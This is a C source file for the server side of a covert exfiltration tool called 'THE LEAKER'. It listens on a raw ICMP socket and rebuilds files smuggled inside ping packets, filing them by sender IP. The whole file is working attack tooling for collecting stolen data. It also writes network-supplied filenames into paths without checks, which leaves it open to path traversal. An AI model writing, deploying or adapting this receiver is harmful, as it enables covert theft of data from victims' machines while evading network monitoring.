#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/stat.h>
#include "icmphdr.h"
#include "iphdr.h"

int isValidIp(char *ip){
	struct sockaddr_in s;
	return (inet_pton(AF_INET, ip, &(s.sin_addr)) != 0);
}
int main(int argc, char **argv){
	FILE *leaked_file;
	int sockfd, bytes;
       	socklen_t from_len;
	char buffer[1024];
	struct sockaddr_in from;
	struct iphdr *ip;
	struct icmphdr *icmp;
	char filename[255];
	char relative_path[500];
	from_len = sizeof(from);
	if(argc < 2){
		printf("Please inform your local ip.\n");
		return 1;
	}
	char *local_ip = argv[1];
	if(!isValidIp(local_ip)){
		return 1;
	}
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if(sockfd == -1){
		perror("socket() Failed");
		return 1;
	}
	from.sin_family = AF_INET;
	from.sin_addr.s_addr = inet_addr(local_ip);
	if(bind(sockfd, (struct sockaddr *)&from, sizeof(from)) == -1){
		perror("bind() Failed");
		return 1;
	}
	struct stat st ={0};
	char *ip_addr;
	printf("*************** THE LEAKER ***************\n");
	printf("***************** SERVER *****************\n");
	printf("Listening on: %s...\n\n", local_ip);
	while(1){
		memset(buffer, 0, 1024);
		memset(filename, 0, 255);
		memset(relative_path, 0, 500);
		bytes = recvfrom(sockfd, buffer, 1024, 0, (struct sockaddr *)&from, &from_len);
		if(bytes == -1){
			perror("recvfrom() Failed");
			return 1;
		}
		ip = (struct iphdr *)buffer;
		icmp = (struct icmphdr *)(buffer + (ip->ihl * 4));
		if(icmp->type == 8 && icmp->id == 0){
			strncpy(filename, icmp->data, icmp->fnz);
			ip_addr = decode_ip(ip->src_addr);
			if(stat(ip_addr, &st) == -1){
				mkdir(ip_addr, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
			}
			strcat(strcat(strcat(relative_path, ip_addr), "/"), filename);
			leaked_file = fopen(relative_path, "ab");
			fwrite(icmp->data + icmp->fnz, bytes - ((ip->ihl *4) + sizeof(struct icmphdr) + icmp->fnz), 1, leaked_file);
			printf("Received data from (%s)\nFilename: %s\nSize: %d\n\n", ip_addr, filename, (int)(bytes - ((ip->ihl * 4) + sizeof(struct icmphdr) + icmp->fnz))); 
			fclose(leaked_file);
			free(ip_addr);			
		}
	}
	return 0;
}
